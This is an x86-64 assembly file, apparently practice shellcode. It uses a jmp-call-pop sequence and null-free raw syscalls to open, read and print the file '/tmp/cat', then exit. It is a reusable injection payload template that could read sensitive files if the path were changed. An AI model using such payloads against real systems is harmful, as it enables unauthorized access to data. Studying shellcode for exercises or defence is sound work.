#include <sys/syscall.h>

#define STRING  "/tmp/cat"

.intel_syntax noprefix

.globl _start
.type  _start, @function

_start:
	jmp _push_filename
  
_readfile:
	pop rdi 
	//xor byte [rdi + 0xb], 0x41
  	mov [0xb + rdi],al      /* null-terminate our string */
	xor rax, rax
	add al, 2
	xor rsi, rsi 
	syscall
	  
	sub sp, 0xfff
	lea rsi, [rsp]
	mov rdi, rax
	xor rdx, rdx
	mov dx, 0xfff
	xor rax, rax
	syscall
	  
	xor rdi, rdi
	add dil, 1 
	mov rdx, rax
	xor rax, rax
	add al, 1
	syscall
	  
	xor rax, rax
	add al, 60
	syscall
	  
_push_filename:
	call _readfile
  	.string STRING
  
